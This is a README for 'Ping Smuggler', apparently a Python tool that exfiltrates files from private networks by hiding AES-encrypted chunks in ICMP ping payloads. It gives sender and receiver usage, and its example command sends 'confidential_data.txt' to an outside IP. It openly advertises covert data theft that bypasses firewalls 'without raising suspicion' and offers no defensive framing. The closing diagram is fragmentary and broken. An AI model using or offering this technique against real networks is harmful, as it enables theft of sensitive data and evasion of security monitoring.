# Ping Smuggler

Ping Smuggler is a Python tool designed to exfiltrate data from a private network by sending encrypted payloads disguised as ICMP ping packets. This technique can be used to bypass firewalls that allow ICMP ping traffic while maintaining a covert channel for data transmission.

## Overview

This repository contains two Python scripts:

1. **Sender Script (sender.py):**
    - Reads a text file and encrypts its contents into chunks.
    - Sends the encrypted chunks as ICMP payloads to a specified destination IP address.

2. **Receiver Script (receiver.py):**
    - Listens for incoming ICMP packets and captures them.
    - Decrypts the encrypted payloads contained within the ICMP packets.
    - Reconstructs the original text file from the decrypted chunks.

## Working Principle

Ping Smuggler utilizes the following approach to exfiltrate data:

1. **Encryption and Transmission (Sender Script):**
    - The sender script encrypts the data from a text file using AES encryption.
    - The encrypted data is split into chunks, and each chunk is sent as the payload of an ICMP ping packet to the specified destination IP address.

2. **Decryption and Reconstruction (Receiver Script):**
    - The receiver script captures the ICMP ping packets containing the encrypted payloads.
    - It decrypts the encrypted payloads using the same AES key.
    - Finally, it reconstructs the original text file from the decrypted chunks.

### Usage

### Sender Script (sender.py)

```bash
python sender.py <file_path> <destination_ip> <key>
```
   - <file_path>: Path to the text file to be exfiltrated.
   - <destination_ip>: IP address of the receiving computer outside the private network.
   - <key>: Encryption key (16, 24, or 32 bytes) for AES encryption.

### Receiver Script (receiver.py)
```bash
python receiver.py <key> <output_cap_file> <output_text_file>
```
   - <key>: Encryption key (must match the key used by the sender script).
   - <output_cap_file>: Path to store the captured ICMP packets (in .cap format).
   - <output_text_file>: Path to store the reconstructed text file.

### Example
## Sender Script

```bash
python sender.py confidential_data.txt 203.0.113.5 top_secret_key
```

## Receiver Script

```bash
python receiver.py top_secret_key received_packets.cap received_text.txt
```
### Usage Scenario
Ping Smuggler can be utilized in scenarios where ICMP ping traffic is allowed through a firewall, providing a covert channel for exfiltrating sensitive data from a private network. By disguising encrypted data as ICMP ping payloads, Ping Smuggler enables the transfer of data without raising suspicion or triggering firewall rules.

|   Sender          +--->+                 +--->+    Receiver             |

```
In this diagram, Ping Smuggler bypasses the firewall by sending encrypted payloads disguised as ICMP ping packets, allowing for the exfiltration of data from the private network to the outside network.
